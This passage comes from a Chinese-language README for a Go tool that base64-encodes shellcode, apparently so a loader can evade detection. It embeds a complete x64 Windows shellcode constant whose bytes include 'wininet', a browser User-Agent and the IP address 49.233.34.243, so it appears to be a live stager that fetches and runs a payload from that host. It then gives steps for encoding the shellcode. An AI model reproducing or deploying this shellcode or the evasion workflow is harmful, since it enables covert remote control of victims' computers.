
## Base64
首先将`Base64.go`里面的buf参数改为自己的shellcode内容
```go
const (
	buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x1d\x09\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4e\x6f\x69\x37\x00\x69\xc5\xf5\xea\x51\xaa\x33\x38\x43\x1b\xc0\x75\x48\x28\xfd\x0f\xaa\x0b\x88\x3a\x30\x68\x21\xac\x09\xd7\x63\x7d\xa3\x7d\x17\x35\x6b\x9a\xa8\x31\xdc\xd0\xb8\xa3\x29\x34\x93\x7d\x22\xba\xab\x9d\x4b\xa0\x1d\xb0\x93\x01\x0f\x4b\x89\x2b\x30\xf0\x5f\x7c\xa5\xb9\xa0\xda\xe0\x38\x8e\xd0\xa9\x56\x5d\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4c\x43\x29\x0d\x0a\x00\x25\x31\x24\x1c\x67\xa0\xe9\x12\x19\x27\xc8\x85\xe0\x4d\x0a\xab\xaf\xf8\x46\x3c\x3d\x2f\x64\xca\x19\x11\x3c\x52\xd0\x6e\xd3\x9d\x4a\xa9\x91\xa0\xa1\x7f\xb7\x54\xcd\xb9\xfa\xd7\x1d\x6b\xc9\x92\xbf\xc2\x1a\xab\x96\x05\xbf\x40\x8d\x85\x55\x15\xc3\xcb\xb6\xf5\xed\x52\x8b\x57\xa2\x59\xad\x42\x7f\xbe\xbd\xe1\x3d\xc7\x81\x36\xcf\xd8\x8f\x5a\xd6\x8d\x06\xcb\x12\x1e\x32\xab\xc5\x41\xa1\x1e\x2a\xab\x75\x6d\xce\x1e\xde\x2f\x37\x12\x1c\x9c\xfe\x99\x7a\x0b\xca\x7e\x8e\xaf\xbf\x19\x2c\xf1\x56\xae\xae\x06\x0a\x33\x70\x8e\x10\xc2\x58\x49\xba\x9d\xf6\x9f\xd8\x5a\x77\x75\x73\x1d\x2d\x0e\x00\xc5\x44\x9c\x82\xf6\x96\x01\x83\x63\x61\x92\xac\x78\xa6\x94\x4c\x10\x5b\xdb\x5e\xbb\xef\xc6\xaf\xc3\xab\x6b\x34\x51\x99\xc0\xe0\x15\xdc\x86\xf1\xf3\x23\x53\x6c\x15\x4b\x12\x74\xc1\xd3\x38\x0c\x00\xd5\x78\xdc\x76\xf2\x64\x4c\x31\xea\xe8\x30\x52\x40\xc8\x9f\xfa\x7f\x44\x62\x38\x72\x93\x2d\xb2\x60\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x39\x2e\x32\x33\x33\x2e\x33\x34\x2e\x32\x34\x33\x00\x19\x69\xa0\x8d"
)
```
然后运行`Base64.go`
go run Base64.go
![image](https://user-images.githubusercontent.com/73928418/123949478-324b7700-d9d5-11eb-9d4f-3699431c4cba.png)
第一个参数是base64编码后的shellcode，第二个参数是随机替换的字符串，这两个参数待会都会用到

